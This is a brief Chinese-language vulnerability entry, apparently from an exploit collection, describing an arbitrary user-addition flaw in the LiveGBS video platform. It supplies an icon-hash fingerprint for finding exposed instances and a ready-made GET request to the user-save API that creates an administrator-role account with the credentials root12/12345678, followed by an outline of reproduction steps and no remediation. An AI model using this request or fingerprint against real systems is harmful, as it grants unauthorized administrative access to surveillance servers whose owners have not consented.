# LiveGBSsave存在任意用户添加漏洞

- **系统**：LiveGBSsave　|　**类型**：其他　|　**CVE**：—
- **指纹**：`icon_hash="-206100324"`
- **请求**：`GET /api/v1/user/save?ID=&Username=root12&Role=%E7%AE%A1%E7%90%86%E5%91%98&Enable=true HTTP/1.1`

**请求体 / payload**
```
添加的用户名为`root12/12345678`\

测试登录\
```

**其他**
- LiveGBS save存在任意用户添加漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * LiveGBS